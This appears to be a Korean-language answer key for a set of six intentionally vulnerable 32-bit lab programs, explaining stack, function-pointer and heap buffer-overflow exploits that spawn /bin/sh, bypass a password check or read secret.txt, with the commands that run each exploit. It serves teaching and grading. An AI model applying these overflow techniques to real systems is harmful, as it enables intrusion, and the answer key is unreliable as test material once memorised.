# overflow_with_joy `code/` 답안

이 문서는 32비트 x86 기준으로 정리된 예제들의 간단한 풀이입니다.  
명령은 모두 `code/` 디렉터리에서 실행한다고 가정합니다.

빌드가 아직 안 되어 있다면 먼저:

```bash
./compile-all.sh
```

## Hackme 1

목표:
- 삽입된 shellcode를 실행해서 `/bin/sh`를 띄운다.

핵심 원리:
- 프로그램이 문자열 버퍼를 함수 포인터로 캐스팅해서 그대로 실행한다.
- `exploit1`에는 32비트 `execve("/bin/sh")` shellcode가 들어 있다.

실행:

```bash
./exploit1
```

기대 결과:
- 새 셸이 실행된다.

## Hackme 2

목표:
- 올바른 비밀번호를 모르더라도 인증을 우회한다.

핵심 원리:
- `password_buffer[16]` 뒤에 `correct`가 붙어 있다.
- 16바이트를 넘는 입력으로 `correct`를 0이 아닌 값으로 덮으면 성공한다.

실행:

```bash
./hackme2 "$(./exploit2)"
```

페이로드 설명:
- `exploit2`는 `A` 20바이트를 출력한다.
- 앞 16바이트는 버퍼를 채우고, 다음 4바이트가 `correct`를 덮는다.

기대 결과:
- `Password correct.` 출력

## Hackme 3

목표:
- 원래 `play()`를 호출하던 함수 포인터를 `jackpot()`으로 바꾼다.

핵심 원리:
- `name[8]` 뒤에 함수 포인터가 이어지도록 상태를 배치했다.
- 입력 8바이트 뒤에 `jackpot` 주소 4바이트를 붙이면 함수 포인터가 덮인다.

실행:

```bash
./hackme3 "$(./exploit3)"
```

직접 주소를 넘기는 방법:

```bash
nm -n ./hackme3 | grep ' jackpot$'
./hackme3 "$(./exploit3 0x080491d6)"
```

페이로드 설명:
- 앞 8바이트: 사용자 이름 자리 채우기
- 뒤 4바이트: `jackpot()` 주소를 little-endian으로 덮기

기대 결과:
- jackpot 메시지가 출력된다.

## Hackme 4

목표:
- 스택의 리턴 주소를 환경 변수에 저장한 shellcode로 바꿔서 `"hacked!\n"`을 출력한다.

핵심 원리:
- `buf[8]` 오버플로우로 저장된 `ebp`와 리턴 주소까지 덮을 수 있다.
- shellcode는 작은 버퍼 대신 환경 변수 `SHELLCODE`에 넣는다.
- `exploit4`는 환경 변수 주소를 읽어 12바이트 패딩 뒤에 4바이트 리턴 주소를 붙인다.

실행:

```bash
export SHELLCODE=$(cat shellcode.bin)
./hackme4 "$(./exploit4 SHELLCODE)"
```

페이로드 설명:
- `A` 8바이트: `buf`
- `A` 4바이트: 저장된 `ebp`
- 마지막 4바이트: 환경 변수의 시작 주소 근처

기대 결과:
- 화면에 `hacked!`가 출력된다.

참고:
- 프로그램 이름 길이 차이 때문에 `exploit4`는 기본적으로 `+2` 보정을 적용한다.

## Hackme 5

목표:
- 스택 버퍼에 넣은 shellcode를 실행해서 `/bin/sh`를 띄운다.

핵심 원리:
- `buf[256]`에 길이 제한 없이 복사하므로 리턴 주소까지 덮을 수 있다.
- 페이로드는 `NOP sled + shellcode + return address` 구조다.
- 리턴 주소를 버퍼 안쪽으로 맞추면 NOP sled를 타고 shellcode에 도달한다.

실행:

```bash
./hackme5 "$(./exploit5)"
```

주소를 직접 조정하는 방법:

```bash
./hackme5 "$(./exploit5 0xffffd6c0)"
```

페이로드 설명:
- NOP sled: 리턴 주소가 조금 빗나가도 착지 가능하게 함
- shellcode: 32비트 `execve("/bin/sh")`
- 마지막 4바이트: 버퍼 안쪽 주소

기대 결과:
- 새 셸이 실행된다.

참고:
- 기본 리턴 주소는 예시값이라 환경에 따라 바뀔 수 있다.
- 필요하면 `gdb ./hackme5`로 `buf` 근처 주소를 확인한 뒤 마지막 4바이트를 조정한다.

## Hackme 6

목표:
- `public.txt` 대신 `secret.txt`를 읽게 만든다.

핵심 원리:
- `userptr`가 먼저 할당되고 `fileptr`가 그 뒤에 할당된다.
- `userptr->name`에 긴 문자열을 복사하면 다음 힙 청크의 `filename`까지 덮을 수 있다.

실행:

```bash
./hackme6 "$(./exploit6)"
```

페이로드 설명:
- `A` 32바이트 뒤에 `secret.txt`
- 앞부분이 힙 상의 다음 구조체 필드까지 밀고 들어가면서 `filename`을 덮는다.

기대 결과:
- `secret.txt` 내용이 출력된다.

## 채점용 한 줄 요약

```bash
./exploit1
./hackme2 "$(./exploit2)"
./hackme3 "$(./exploit3)"
export SHELLCODE=$(cat shellcode.bin) && ./hackme4 "$(./exploit4 SHELLCODE)"
./hackme5 "$(./exploit5)"
./hackme6 "$(./exploit6)"
```
